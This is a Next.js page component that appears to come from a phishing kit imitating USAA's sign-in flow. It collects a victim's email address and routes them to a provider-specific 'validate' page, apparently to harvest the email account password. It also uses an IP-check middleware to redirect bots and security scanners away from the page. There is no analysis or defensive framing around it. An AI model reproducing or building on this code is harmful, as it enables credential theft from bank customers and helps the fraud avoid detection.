import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface EmailProps { }

const schema = yup.object().shape({
  email: yup
    .string()
    .required("Enter your email address")
    .email("Enter a valid email address"),
});

export const Email: React.FC<EmailProps> = ({ }) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Now, let's continue with your email address."
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      subTitle={`Please Verify Your Email`}
      errors={errors}
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <Input
            label={`Email Address`}
            name={`email`}
            register={register}
            error={errors.email && (errors.email.message as unknown as string)}
          />
        </div>
      </div>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
        redirect: {
          destination: process.env.NEXT_PUBLIC_EXIT_URL,
          permanent: false,
        },
      }
      : {}),
  };
};

export default Email;
